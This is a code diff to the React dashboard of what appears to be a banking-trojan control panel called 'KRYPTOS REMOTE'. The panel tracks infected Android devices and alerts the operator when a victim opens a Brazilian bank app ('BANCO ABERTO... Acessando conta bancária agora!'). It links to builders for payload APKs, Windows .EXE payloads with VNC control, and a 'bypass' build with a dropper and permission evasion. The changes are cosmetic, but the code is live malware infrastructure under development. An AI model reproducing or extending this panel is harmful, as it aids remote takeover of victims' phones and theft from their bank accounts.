@@ -28,8 +28,8 @@ const BANK_BRAND_MAP: Record<string, { bg: string; text: string; label: string; 
   'br.com.santander':         { bg: 'linear-gradient(135deg,#ec0000,#a30000)', text: '#fff', label: 'SAN' },
   'br.com.bancointer':        { bg: 'linear-gradient(135deg,#ff7a00,#e06900)', text: '#fff', label: 'INT' },
   'br.com.intermedium':       { bg: 'linear-gradient(135deg,#ff7a00,#e06900)', text: '#fff', label: 'INT' },
-  'br.com.caixa':             { bg: 'linear-gradient(135deg,#005ca9,#703d00)', text: '#fff', label: 'CEF' },
-  'br.gov.caixa':             { bg: 'linear-gradient(135deg,#005ca9,#703d00)', text: '#fff', label: 'CEF' },
+  'br.com.caixa':             { bg: 'linear-gradient(135deg,#a90000,#703d00)', text: '#fff', label: 'CEF' },
+  'br.gov.caixa':             { bg: 'linear-gradient(135deg,#a90000,#703d00)', text: '#fff', label: 'CEF' },
   'br.com.c6bank':            { bg: 'linear-gradient(135deg,#242424,#000)', text: '#ffd700', label: 'C6' },
   'br.com.neon':              { bg: 'linear-gradient(135deg,#ffbf00,#aa8000)', text: '#fff', label: 'NEO' },
   'br.com.pagbank':           { bg: 'linear-gradient(135deg,#03a64a,#027a35)', text: '#fff', label: 'PAG' },
@@ -68,7 +68,7 @@ const BANK_BRAND_MAP: Record<string, { bg: string; text: string; label: string; 
   'br.com.safra':             { bg: 'linear-gradient(135deg,#854d0e,#422006)', text: '#fff', label: 'SFR' },
 };
 function getBankBrand(pkg: string) {
-  if (!pkg) return { bg: 'linear-gradient(135deg,#5f3a1e,#401105)', text: '#ffa3a3', label: '🏦' };
+  if (!pkg) return { bg: 'linear-gradient(135deg,#5f3a1e,#401105)', text: '#ffa3a3', label: '' };
   const pkgLower = pkg.toLowerCase();
   if (BANK_BRAND_MAP[pkgLower]) return BANK_BRAND_MAP[pkgLower];
   for (const key of Object.keys(BANK_BRAND_MAP)) {
@@ -108,7 +108,7 @@ function getBankBrand(pkg: string) {
   if (pkgLower.includes('bs2')) return BANK_BRAND_MAP['br.com.bs2.banco'];
   if (pkgLower.includes('next')) return BANK_BRAND_MAP['br.com.next'];
   if (pkgLower.includes('safra')) return BANK_BRAND_MAP['br.com.safra'];
-  return { bg: 'linear-gradient(135deg,#5f3a1e,#401105)', text: '#ffa3a3', label: '🏦' };
+  return { bg: 'linear-gradient(135deg,#5f3a1e,#401105)', text: '#ffa3a3', label: '' };
 }
 interface BankIconProps { pkg: string; iconB64?: string; name?: string; size?: number; }
 function BankIcon({ pkg, iconB64, name, size = 36 }: BankIconProps) {
@@ -176,6 +176,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
   const [toasts, setToasts] = useState<any[]>([]);
   const [activityLog, setActivityLog] = useState<ActivityEvent[]>([]);
   const [isSidebarOpen, setIsSidebarOpen] = useState(true);
+      const [showCreateMenu, setShowCreateMenu] = useState(false);
   const [soundEnabled, setSoundEnabled] = useState(true);
   const [hideIps, setHideIps] = useState<boolean>(() => localStorage.getItem('hide_ips') !== 'false');
   const prevDevicesRef = useRef<Device[]>([]);
@@ -439,7 +440,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
             type: 'bank_open',
             deviceId: dev.device_id,
             deviceModel: modelName,
-            title: `🚨 BANCO ABERTO: ${appName}`,
+            title: ` BANCO ABERTO: ${appName}`,
             description: `Acessando conta bancária agora!`,
             timestamp: new Date().toLocaleTimeString('pt-BR'),
             bankPackage: dev.active_bank.package,
@@ -497,7 +498,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
           type: 'device_online',
           deviceId: dev.device_id,
           deviceModel: modelName,
-          title: '📶 APARELHO CONECTADO',
+          title: ' APARELHO CONECTADO',
           description: `Dispositivo estabeleceu conexão ativa.`,
           timestamp: nowStr
         });
@@ -513,7 +514,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
           type: 'device_offline',
           deviceId: dev.device_id,
           deviceModel: modelName,
-          title: '⚠️ APARELHO DESCONECTADO',
+          title: '️ APARELHO DESCONECTADO',
           description: `Aparelho perdeu conexão com o servidor.`,
           timestamp: nowStr
         });
@@ -532,7 +533,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
             type: 'bank_open',
             deviceId: dev.device_id,
             deviceModel: modelName,
-            title: `🚨 BANCO ABERTO: ${appName}`,
+            title: ` BANCO ABERTO: ${appName}`,
             description: `Acessando conta bancária agora!`,
             timestamp: nowStr,
             bankPackage: dev.active_bank.package,
@@ -542,7 +543,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
           if (shouldNotify) {
             playAlertSound();
             showToast(
-              "🚨 BANCO ACESSADO!",
+              " BANCO ACESSADO!",
               `${modelName} está acessando o ${appName}`,
               "open",
               dev.active_bank.package,
@@ -551,7 +552,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
             
             if ("Notification" in window && Notification.permission === "granted") {
               try {
-                new Notification(`🚨 Banco Acessado: ${appName}`, {
+                new Notification(` Banco Acessado: ${appName}`, {
                   body: `Aparelho ${modelName} abriu o aplicativo!`,
                   icon: "/gangstar-logo.svg"
                 });
@@ -571,7 +572,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
           type: 'bank_close',
           deviceId: dev.device_id,
           deviceModel: modelName,
-          title: `ℹ️ BANCO FECHADO: ${appName}`,
+          title: `️ BANCO FECHADO: ${appName}`,
           description: `Fechou o aplicativo bancário.`,
           timestamp: nowStr,
           bankPackage: prevDev.active_bank.package,
@@ -580,7 +581,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
         
         if (shouldNotify) {
           showToast(
-            "ℹ️ BANCO FECHADO",
+            "️ BANCO FECHADO",
             `${modelName} fechou o ${appName}`,
             "closed",
             prevDev.active_bank.package,
@@ -589,7 +590,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
           
           if ("Notification" in window && Notification.permission === "granted") {
             try {
-              new Notification(`ℹ️ Banco Fechado: ${appName}`, {
+              new Notification(`️ Banco Fechado: ${appName}`, {
                 body: `Aparelho ${modelName} fechou o aplicativo.`,
                 icon: "/gangstar-logo.svg"
               });
@@ -612,7 +613,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
             type: 'device_online',
             deviceId: dev.device_id,
             deviceModel: modelName,
-            title: '✨ NOVO APARELHO INSTALADO',
+            title: ' NOVO APARELHO INSTALADO',
             description: `Novo dispositivo registrado no painel.`,
             timestamp: nowStr
           });
@@ -642,7 +643,7 @@ export default function Dashboard({ onLogout }: DashboardProps) {
             deviceId: e.deviceId,
             deviceModel: e.deviceModel,
             bankPackage: e.bankPackage || '',
-            bankName: e.title.replace('🚨 BANCO ABERTO: ', '').replace('ℹ️ BANCO FECHADO: ', ''),
+            bankName: e.title.replace(' BANCO ABERTO: ', '').replace('️ BANCO FECHADO: ', ''),
             status: (e.type === 'bank_open' ? 'open' : 'closed') as 'open' | 'closed',
             timestamp: e.timestamp,
             iconB64: e.iconB64
@@ -693,141 +694,86 @@ export default function Dashboard({ onLogout }: DashboardProps) {
   return (
     <div className="h-screen w-screen overflow-hidden bg-transparent text-slate-100 flex safe-top safe-bottom relative">
       {/* Background ambient lighting glow */}
-      <div className="absolute top-0 left-1/4 w-[600px] h-[350px] bg-cyan-500/18 blur-[160px] pointer-events-none rounded-full" />
-      <div className="absolute top-1/3 right-10 w-[500px] h-[350px] bg-blue-600/18 blur-[160px] pointer-events-none rounded-full" />
+      <div className="absolute top-0 left-1/4 w-[600px] h-[350px] bg-[#ef4444]/18 blur-[160px] pointer-events-none rounded-full" />
+      <div className="absolute top-1/3 right-10 w-[500px] h-[350px] bg-[#ef4444]/18 blur-[160px] pointer-events-none rounded-full" />
 
       <DashboardSidebar onLogout={onLogout} isMobile={isMobile} />
 
       <div className={`flex-1 flex flex-col h-full min-w-0 relative z-10 overflow-hidden ${isMobile ? 'pb-16' : ''}`}>
         {/* HEADER TOP BAR */}
-        <header className="bg-[#190403]/70 border-b border-cyan-500/30 px-4 sm:px-6 py-3.5 flex-shrink-0 backdrop-blur-2xl relative shadow-[0_4px_25px_rgba(0,0,0,0.6)]">
-          <div className="absolute bottom-0 left-0 right-0 h-[1px] bg-gradient-to-r from-transparent via-cyan-400/40 to-transparent"></div>
-          <div className="flex items-center justify-between gap-4">
-            {/* 💎 KRYPTOS REMOTE - BRANDING HEADER */}
-            <div className="flex items-center gap-3 select-none">
-              {/* Logo Redondo Azul com Brilho Neon */}
-              <div className="relative flex items-center justify-center flex-shrink-0">
-                <div className="absolute -inset-1 bg-sky-500/35 rounded-full blur-md animate-pulse" />
-                <div className="relative w-8 h-8 rounded-full p-[1.5px] bg-gradient-to-tr from-cyan-400 to-blue-600 shadow-[0_0_15px_rgba(255,43,43,0.55)] flex items-center justify-center">
-                  <div className="w-full h-full rounded-full bg-[#190403] flex items-center justify-center overflow-hidden">
-                    <img
-                      src="/gangstar-logo.svg?v=2"
-                      alt="Kryptos Logo"
-                      className="w-5 h-5 object-contain"
-                      style={{ filter: 'drop-shadow(0 0 8px rgba(255, 43, 43, 0.95)) brightness(1.2)' }}
-                    />
-                  </div>
-                </div>
+        <header className="bg-[#0f0f11]/85 border-b border-[#2a2a31] px-4 sm:px-5 py-2.5 flex-shrink-0 backdrop-blur-2xl relative">
+          <div className="flex items-center gap-3">
+            <div className="flex items-center gap-2.5 select-none flex-shrink-0">
+              <div className="w-7 h-7 rounded-md border border-[#3a3a44] bg-[#121214] flex items-center justify-center">
+                <img src="/gangstar-logo.svg?v=3" alt="Kryptos" className="w-4 h-4 object-contain" />
               </div>
-
-              {/* Apenas o Nome KRYPTOS REMOTE em Azul */}
-              <h1 className="text-base sm:text-lg font-black tracking-wider uppercase font-sans bg-gradient-to-r from-cyan-300 via-sky-400 to-blue-500 bg-clip-text text-transparent drop-shadow-[0_0_12px_rgba(255,107,107,0.75)] leading-none">
-                KRYPTOS REMOTE
-              </h1>
+              <div className="leading-none">
+                <h1 className="text-[13px] font-black tracking-[0.18em] uppercase text-[#e8e8ea]">KRYPTOS</h1>
+                <span className="text-[9px] font-mono uppercase tracking-[0.14em] text-[#6f6f78]">Consola de flota</span>
+              </div>
             </div>
 
-            <div className="flex items-center gap-2 sm:gap-3 flex-shrink-0">
-              <div className="flex items-center gap-2 text-xs font-mono">
-                <span className="px-3 py-1 bg-slate-900/90 border border-slate-700/60 rounded-full text-slate-300 shadow-inner">
-                  {t('nav.total')}: <span className="text-cyan-300 font-bold">{clientes.length}</span>
-                </span>
-                <span className="px-3 py-1 bg-cyan-500/15 border border-cyan-500/40 rounded-full text-cyan-400 font-bold flex items-center gap-2 shadow-[0_0_12px_rgba(239,68,68,0.2)]">
-                  <span className="h-2 w-2 rounded-full bg-cyan-400 animate-pulse shadow-[0_0_8px_rgba(239,68,68,0.8)]"></span>
-                  {onlineCount} {t('nav.online')}
-                </span>
-                <span className="px-3 py-1 bg-slate-900/90 border border-slate-800 rounded-full text-slate-500 hidden sm:inline">
-                  ● {offlineCount} {t('nav.offline')}
-                </span>
-              </div>
+            <div className="hidden sm:flex items-center text-[11px] font-mono border border-[#2a2a31] rounded-md overflow-hidden ml-2">
+              <span className="px-2.5 py-1 text-[#8b8b94] border-r border-[#2a2a31]">{t('nav.total')} <b className="text-[#e8e8ea]">{clientes.length}</b></span>
+              <span className="px-2.5 py-1 text-[#ef4444] border-r border-[#2a2a31] bg-[#ef4444]/10">{onlineCount} {t('nav.online')}</span>
+              <span className="px-2.5 py-1 text-[#6f6f78]">{offlineCount} {t('nav.offline')}</span>
+            </div>
 
-              {!isMobile && (
-                <div id="tour-build-buttons" className="hidden md:flex items-center gap-2.5">
-                  <button
-                    type="button"
-                    onClick={() => {
-                      setShowMyAppsModal(true);
-                      loadBuilds();
-                    }}
-                    className="flex items-center gap-2 px-3.5 py-2 bg-slate-900/90 border border-cyan-500/40 hover:bg-cyan-500/15 text-cyan-300 rounded-xl text-xs font-bold uppercase tracking-wider shadow-[0_0_12px_rgba(255,43,43,0.15)] transition-all hover:scale-105"
-                  >
-                    <Smartphone className="w-4 h-4 text-cyan-400" />
-                    {t('nav.my_apps')}
-                  </button>
-                  <button
-                    type="button"
-                    onClick={() => navigate('/win-builder')}
-                    className="flex items-center gap-2 px-3.5 py-2 bg-gradient-to-r from-cyan-600 via-blue-600 to-sky-500 hover:from-cyan-500 hover:to-blue-500 text-white rounded-xl text-xs font-black uppercase tracking-wider shadow-[0_0_18px_rgba(255,43,43,0.4)] transition-all transform hover:scale-105 active:scale-95 border border-cyan-400/40"
-                    title="Central Windows: Gerar Payload .EXE e Controle VNC de PCs"
-                  >
-                    <Monitor className="w-4 h-4 text-cyan-300" />
-                    <span>{t('nav.gen_exe')}</span>
-                  </button>
-                  <button
-                    type="button"
-                    onClick={() => navigate('/build-apk')}
-                    className="flex items-center gap-2 px-3.5 py-2 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white rounded-xl text-xs font-bold uppercase tracking-wider shadow-[0_0_15px_rgba(255,43,43,0.35)] transition-all hover:scale-105 active:scale-95"
-                  >
-                    <Package className="w-4 h-4" />
-                    {t('nav.gen_apk')}
-                  </button>
-                  <button
-                    type="button"
-                    onClick={() => navigate('/apk-bypass')}
-                    className="flex items-center gap-2 px-3.5 py-2 bg-gradient-to-r from-cyan-600 via-blue-600 to-sky-500 hover:from-cyan-500 hover:to-sky-400 text-white rounded-xl text-xs font-black uppercase tracking-wider shadow-[0_0_18px_rgba(239,68,68,0.5)] transition-all transform hover:scale-105 active:scale-95 border border-cyan-300/50"
-                    title="Build com Bypass (PROJETO: Bateria, Permissões, Dropper)"
-                  >
-                    <Zap className="w-4 h-4 text-cyan-200 animate-pulse" />
-                    {t('nav.gen_bypass')}
-                  </button>
-                </div>
-              )}
+            <div className="flex-1" />
+
+            <div className="flex items-center gap-1.5 flex-shrink-0">
               <button
                 type="button"
-                onClick={() => {
-                  const next = !hideIps;
-                  setHideIps(next);
-                  localStorage.setItem('hide_ips', String(next));
-                }}
-                className={`flex items-center gap-1.5 px-3 py-2 rounded-xl border text-xs font-bold transition-all ${
-                  hideIps
-                    ? 'bg-cyan-950/90 border-cyan-400/60 text-cyan-200 shadow-[0_0_12px_rgba(239,68,68,0.3)]'
-                    : 'bg-slate-900/90 border-cyan-500/20 text-slate-300 hover:text-cyan-300 hover:bg-slate-800'
-                }`}
+                onClick={() => { const next = !hideIps; setHideIps(next); localStorage.setItem('hide_ips', String(next)); }}
+                className={`p-2 rounded-md border transition-all ${hideIps ? 'bg-[#ef4444]/15 border-[#3a3a44] text-[#ef4444]' : 'bg-[#121214] border-[#2a2a31] text-[#8b8b94] hover:text-[#e8e8ea]'}`}
                 title={hideIps ? t('nav.show_ips') : t('nav.hide_ips')}
               >
-                {hideIps ? <EyeOff className="w-4 h-4 text-cyan-300" /> : <Eye className="w-4 h-4 text-cyan-400" />}
-                <span className="hidden sm:inline">{hideIps ? t('nav.hide_ips') : t('nav.show_ips')}</span>
+                {hideIps ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
               </button>
-              <LanguageSelector />
               <button
                 type="button"
                 onClick={() => loadDevices(false)}
-                className="p-2.5 bg-slate-900/90 hover:bg-slate-800 rounded-xl border border-cyan-500/20 text-slate-300 hover:text-cyan-300 transition-all hover:shadow-[0_0_12px_rgba(255,43,43,0.2)] cursor-pointer"
+                className="p-2 rounded-md border border-[#2a2a31] bg-[#121214] text-[#8b8b94] hover:text-[#e8e8ea] transition-all"
                 title={t('nav.refresh')}
               >
-                <RefreshCw className={`w-4 h-4 ${refreshing ? 'animate-spin text-cyan-400' : ''}`} />
+                <RefreshCw className={`w-4 h-4 ${refreshing ? 'animate-spin text-[#ef4444]' : ''}`} />
               </button>
-              <button
-                type="button"
-                onClick={() => {
-                  loadUserProfile();
-                  setShowProfileModal(true);
-                }}
-                className="p-2.5 bg-slate-900/90 hover:bg-slate-800 rounded-xl border border-cyan-500/20 text-slate-300 hover:text-cyan-300 transition-all hover:shadow-[0_0_12px_rgba(255,43,43,0.2)] cursor-pointer"
-                title={t('nav.profile')}
-              >
+              <LanguageSelector />
+              <div className="relative">
+                <button
+                  type="button"
+                  onClick={() => setShowCreateMenu(!showCreateMenu)}
+                  className="flex items-center gap-1.5 px-3 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md text-[11px] font-black uppercase tracking-wider transition-all"
+                >
+                  <span className="text-sm leading-none">+</span>
+                  {t('nav.gen_apk')}
+                  <span className="text-[9px] leading-none opacity-70"></span>
+                </button>
+                {showCreateMenu && (
+                  <>
+                    <div className="fixed inset-0 z-40" onClick={() => setShowCreateMenu(false)} />
+                    <div className="absolute right-0 top-[calc(100%+6px)] z-50 w-60 bg-[#1a1a1e] border border-[#2a2a31] rounded-md shadow-[0_16px_40px_rgba(0,0,0,0.6)] p-1">
+                      <button type="button" onClick={() => { setShowCreateMenu(false); navigate('/build-apk'); }} className="w-full flex items-center gap-2.5 px-2.5 py-2 rounded text-left text-[11px] font-bold text-[#e8e8ea] hover:bg-[#24242a]">
+                        <Package className="w-4 h-4 text-[#ef4444]" /> {t('nav.gen_apk')}
+                      </button>
+                      <button type="button" onClick={() => { setShowCreateMenu(false); navigate('/apk-bypass'); }} className="w-full flex items-center gap-2.5 px-2.5 py-2 rounded text-left text-[11px] font-bold text-[#e8e8ea] hover:bg-[#24242a]">
+                        <Zap className="w-4 h-4 text-[#ef4444]" /> {t('nav.gen_bypass')}
+                      </button>
+                      <button type="button" onClick={() => { setShowCreateMenu(false); navigate('/win-builder'); }} className="w-full flex items-center gap-2.5 px-2.5 py-2 rounded text-left text-[11px] font-bold text-[#e8e8ea] hover:bg-[#24242a]">
+                        <Monitor className="w-4 h-4 text-[#ef4444]" /> {t('nav.gen_exe')}
+                      </button>
+                      <div className="my-1 h-px bg-[#2a2a31]" />
+                      <button type="button" onClick={() => { setShowCreateMenu(false); setShowMyAppsModal(true); loadBuilds(); }} className="w-full flex items-center gap-2.5 px-2.5 py-2 rounded text-left text-[11px] font-bold text-[#e8e8ea] hover:bg-[#24242a]">
+                        <Smartphone className="w-4 h-4 text-[#8b8b94]" /> {t('nav.my_apps')}
+                      </button>
+                    </div>
+                  </>
+                )}
+              </div>
+              <button type="button" onClick={() => { loadUserProfile(); setShowProfileModal(true); }} className="p-2 rounded-md border border-[#2a2a31] bg-[#121214] text-[#8b8b94] hover:text-[#e8e8ea] transition-all" title={t('nav.profile')}>
                 <User className="w-4 h-4" />
               </button>
-              <button
-                type="button"
-                onClick={() => setIsSidebarOpen(!isSidebarOpen)}
-                className={`p-2.5 rounded-xl border transition-all cursor-pointer ${
-                  isSidebarOpen 
-                    ? 'bg-cyan-500/20 border-cyan-400/50 text-cyan-300 shadow-[0_0_15px_rgba(255,43,43,0.3)]' 
-                    : 'bg-slate-900/90 border-cyan-500/20 text-slate-400 hover:bg-slate-800 hover:text-white'
-                }`}
-                title={t('nav.radar')}
-              >
+              <button type="button" onClick={() => setIsSidebarOpen(!isSidebarOpen)} className={`p-2 rounded-md border transition-all ${isSidebarOpen ? 'bg-[#ef4444]/20 border-[#3a3a44] text-[#ef4444]' : 'bg-[#121214] border-[#2a2a31] text-[#8b8b94] hover:text-[#e8e8ea]'}`} title={t('nav.radar')}>
                 <Bell className="w-4 h-4" />
               </button>
             </div>
@@ -836,99 +782,99 @@ export default function Dashboard({ onLogout }: DashboardProps) {
 
         <div className="flex-1 flex overflow-hidden">
           <main className="flex-1 p-4 sm:p-6 overflow-auto">
-          {/* 🚀 PAINEL PREMIUM DE ESTATÍSTICAS (PING SERVIDOR, APARELHOS E APPS GUARDADOS) */}
-          <div className="mb-6 grid grid-cols-1 sm:grid-cols-3 gap-4">
-            {/* ⚡ BADGE 1: PING SERVIDOR */}
-            <div className="relative bg-gradient-to-br from-[#330b03]/90 via-[#240703]/90 to-[#180403]/90 border border-cyan-500/40 hover:border-cyan-300 rounded-2xl p-4 backdrop-blur-2xl shadow-[0_0_25px_rgba(239,68,68,0.18)] flex items-center justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(239,68,68,0.3)] group overflow-hidden">
-              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-cyan-500/10 rounded-full blur-2xl group-hover:bg-cyan-500/20 transition-all pointer-events-none"></div>
+          {/*  PAINEL PREMIUM DE ESTATÍSTICAS (PING SERVIDOR, APARELHOS E APPS GUARDADOS) */}
+          <div className="mb-4 grid grid-cols-1 sm:grid-cols-3 gap-3">
+            {/*  BADGE 1: PING SERVIDOR */}
+            <div className="relative bg-gradient-to-br from-[#330b03]/90 via-[#240703]/90 to-[#180403]/90 border border-[#2a2a31]/40 hover:border-[#4a4a56] rounded-md p-3 backdrop-blur-2xl shadow-[0_0_25px_rgba(239,68,68,0.18)] flex items-center justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(239,68,68,0.3)] group overflow-hidden">
+              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-[#ef4444]/10 rounded-full blur-2xl group-hover:bg-[#ef4444]/20 transition-all pointer-events-none"></div>
               <div className="flex items-center gap-3.5 relative z-10">
-                <div className="p-3 rounded-xl bg-gradient-to-br from-cyan-500/25 to-blue-600/30 border border-cyan-400/60 text-cyan-300 shadow-[0_0_15px_rgba(239,68,68,0.4)] group-hover:scale-110 transition-transform">
-                  <Wifi className="w-5 h-5 text-cyan-300 animate-pulse" />
+                <div className="p-2 rounded-md bg-gradient-to-br from-[#ef4444]/25 to-[#ef4444]/30 border border-[#3a3a44]/60 text-[#ef4444] shadow-[0_0_15px_rgba(239,68,68,0.4)] group-hover:scale-110 transition-transform">
+                  <Wifi className="w-4 h-4 text-[#ef4444] animate-pulse" />
                 </div>
                 <div>
-                  <span className="text-[11px] font-black text-cyan-300/80 uppercase font-mono tracking-widest block">{t('stats.ping_server')}</span>
+                  <span className="text-[11px] font-black text-[#ef4444]/80 uppercase font-mono tracking-widest block">{t('stats.ping_server')}</span>
                   <div className="flex items-baseline gap-1.5 mt-0.5">
-                    <span className="text-2xl font-black text-white font-mono tracking-tight group-hover:text-cyan-200 transition-colors">{serverPing}</span>
-                    <span className="text-xs text-cyan-400 font-mono font-bold">ms</span>
+                    <span className="text-xl font-black text-white font-mono tracking-tight group-hover:text-[#e8e8ea] transition-colors">{serverPing}</span>
+                    <span className="text-xs text-[#ef4444] font-mono font-bold">ms</span>
                   </div>
                 </div>
               </div>
-              <span className="text-[10px] text-cyan-400 font-mono font-black px-2.5 py-1 rounded-full bg-cyan-950/80 border border-cyan-500/40 shadow-[0_0_10px_rgba(239,68,68,0.3)] flex items-center gap-1.5 relative z-10">
-                <span className="w-2 h-2 rounded-full bg-cyan-400 animate-ping"></span>
+              <span className="text-[10px] text-[#ef4444] font-mono font-black px-2.5 py-1 rounded-full bg-[#121214]/80 border border-[#2a2a31]/40 shadow-[0_0_10px_rgba(239,68,68,0.3)] flex items-center gap-1.5 relative z-10">
+                <span className="w-2 h-2 rounded-full bg-[#ef4444] animate-ping"></span>
                 {t('nav.online')}
               </span>
             </div>
 
-            {/* 📱 BADGE 2: APARELHOS / DISPOSITIVOS (AZUL MODERNO) */}
-            <div className="relative bg-gradient-to-br from-[#330b03]/90 via-[#240703]/90 to-[#180403]/90 border border-cyan-500/50 hover:border-cyan-300 rounded-2xl p-4 backdrop-blur-2xl shadow-[0_0_25px_rgba(239,68,68,0.22)] flex flex-col justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(239,68,68,0.4)] group overflow-hidden">
-              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-cyan-500/15 rounded-full blur-2xl group-hover:bg-cyan-500/25 transition-all pointer-events-none"></div>
+            {/*  BADGE 2: APARELHOS / DISPOSITIVOS (AZUL MODERNO) */}
+            <div className="relative bg-gradient-to-br from-[#330b03]/90 via-[#240703]/90 to-[#180403]/90 border border-[#2a2a31]/50 hover:border-[#4a4a56] rounded-md p-3 backdrop-blur-2xl shadow-[0_0_25px_rgba(239,68,68,0.22)] flex flex-col justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(239,68,68,0.4)] group overflow-hidden">
+              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-[#ef4444]/15 rounded-full blur-2xl group-hover:bg-[#ef4444]/25 transition-all pointer-events-none"></div>
               <div className="flex items-center justify-between relative z-10">
                 <div className="flex items-center gap-3.5">
-                  <div className="p-3 rounded-xl bg-gradient-to-br from-cyan-500/30 to-blue-600/40 border border-cyan-400/70 text-cyan-200 shadow-[0_0_15px_rgba(239,68,68,0.5)] group-hover:scale-110 transition-transform">
-                    <Smartphone className="w-5 h-5 text-cyan-300 animate-pulse" />
+                  <div className="p-2 rounded-md bg-gradient-to-br from-[#ef4444]/30 to-[#ef4444]/40 border border-[#3a3a44]/70 text-[#e8e8ea] shadow-[0_0_15px_rgba(239,68,68,0.5)] group-hover:scale-110 transition-transform">
+                    <Smartphone className="w-4 h-4 text-[#ef4444] animate-pulse" />
                   </div>
                   <div>
-                    <span className="text-[11px] font-black text-cyan-300/90 uppercase font-mono tracking-widest block">{t('stats.devices')}</span>
+                    <span className="text-[11px] font-black text-[#ef4444]/90 uppercase font-mono tracking-widest block">{t('stats.devices')}</span>
                     <div className="flex items-baseline gap-2 mt-0.5">
-                      <span className="text-2xl font-black text-white font-mono tracking-tight">{clientes.length}</span>
-                      <span className="text-xs text-cyan-300/70 font-mono font-bold">{t('stats.registered')}</span>
+                      <span className="text-xl font-black text-white font-mono tracking-tight">{clientes.length}</span>
+                      <span className="text-xs text-[#ef4444]/70 font-mono font-bold">{t('stats.registered')}</span>
                     </div>
                   </div>
                 </div>
-                <span className="text-[10px] font-mono text-cyan-200 font-black px-3 py-1 rounded-full bg-cyan-950/90 border border-cyan-400/60 shadow-[0_0_12px_rgba(239,68,68,0.35)]">
+                <span className="text-[10px] font-mono text-[#e8e8ea] font-black px-3 py-1 rounded-full bg-[#121214]/90 border border-[#3a3a44]/60 shadow-[0_0_12px_rgba(239,68,68,0.35)]">
                   {onlineCount} ON
                 </span>
               </div>
 
               {/* Visual Progress bar ratio of Online devices in Electric Blue */}
-              <div className="mt-3 w-full bg-slate-900/90 h-1.5 rounded-full overflow-hidden border border-cyan-900/50 relative z-10">
+              <div className="mt-2.5 w-full bg-[#121214]/90 h-1 rounded-full overflow-hidden border border-[#1a1a1e]/50 relative z-10">
                 <div 
-                  className="h-full bg-gradient-to-r from-blue-600 via-cyan-400 to-sky-300 rounded-full transition-all duration-500 shadow-[0_0_12px_rgba(239,68,68,0.9)]"
+                  className="h-full bg-gradient-to-r from-[#ef4444] via-[#f87171] to-[#fca5a5] rounded-full transition-all duration-500 shadow-[0_0_12px_rgba(239,68,68,0.9)]"
                   style={{ width: clientes.length > 0 ? `${(onlineCount / clientes.length) * 100}%` : '0%' }}
                 ></div>
               </div>
             </div>
 
-            {/* 📦 BADGE 3: APPS GUARDADOS (AZUL MODERNO) */}
-            <div className="relative bg-gradient-to-br from-[#330b03]/90 via-[#240703]/90 to-[#180403]/90 border border-cyan-500/50 hover:border-cyan-300 rounded-2xl p-4 backdrop-blur-2xl shadow-[0_0_25px_rgba(239,68,68,0.22)] flex items-center justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(239,68,68,0.4)] group overflow-hidden">
-              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-cyan-500/15 rounded-full blur-2xl group-hover:bg-cyan-500/25 transition-all pointer-events-none"></div>
+            {/*  BADGE 3: APPS GUARDADOS (AZUL MODERNO) */}
+            <div className="relative bg-gradient-to-br from-[#330b03]/90 via-[#240703]/90 to-[#180403]/90 border border-[#2a2a31]/50 hover:border-[#4a4a56] rounded-md p-3 backdrop-blur-2xl shadow-[0_0_25px_rgba(239,68,68,0.22)] flex items-center justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(239,68,68,0.4)] group overflow-hidden">
+              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-[#ef4444]/15 rounded-full blur-2xl group-hover:bg-[#ef4444]/25 transition-all pointer-events-none"></div>
               <div className="flex items-center gap-3.5 relative z-10">
-                <div className="p-3 rounded-xl bg-gradient-to-br from-blue-600/30 via-cyan-500/30 to-sky-400/30 border border-cyan-400/70 text-cyan-200 shadow-[0_0_15px_rgba(239,68,68,0.5)] group-hover:scale-110 transition-transform">
-                  <Package className="w-5 h-5 text-cyan-300" />
+                <div className="p-2 rounded-md bg-gradient-to-br from-[#ef4444]/30 via-[#f87171]/30 to-[#f87171]/30 border border-[#3a3a44]/70 text-[#e8e8ea] shadow-[0_0_15px_rgba(239,68,68,0.5)] group-hover:scale-110 transition-transform">
+                  <Package className="w-5 h-5 text-[#ef4444]" />
                 </div>
                 <div>
-                  <span className="text-[11px] font-black text-cyan-300/90 uppercase font-mono tracking-widest block">{t('stats.stored_apps')}</span>
+                  <span className="text-[11px] font-black text-[#ef4444]/90 uppercase font-mono tracking-widest block">{t('stats.stored_apps')}</span>
                   <div className="flex items-baseline gap-1.5 mt-0.5">
-                    <span className="text-2xl font-black text-white font-mono tracking-tight">{builds.length}</span>
-                    <span className="text-xs text-cyan-300/70 font-mono font-bold">APKs</span>
+                    <span className="text-xl font-black text-white font-mono tracking-tight">{builds.length}</span>
+                    <span className="text-xs text-[#ef4444]/70 font-mono font-bold">APKs</span>
                   </div>
                 </div>
               </div>
               <button
                 type="button"
                 onClick={() => setShowMyAppsModal(true)}
